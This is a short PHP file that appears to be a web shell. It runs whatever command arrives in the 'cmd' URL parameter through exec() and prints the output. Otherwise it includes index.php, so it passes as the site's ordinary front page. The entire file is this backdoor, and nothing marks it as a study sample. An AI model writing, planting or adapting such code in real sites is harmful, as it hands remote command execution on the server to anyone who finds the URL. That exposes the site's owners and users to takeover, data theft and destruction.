<?php

$cmd = $_GET['cmd'];

if(isset($cmd))
{
	echo exec("$cmd");
}
else
{
        include("index.php");
}
?>
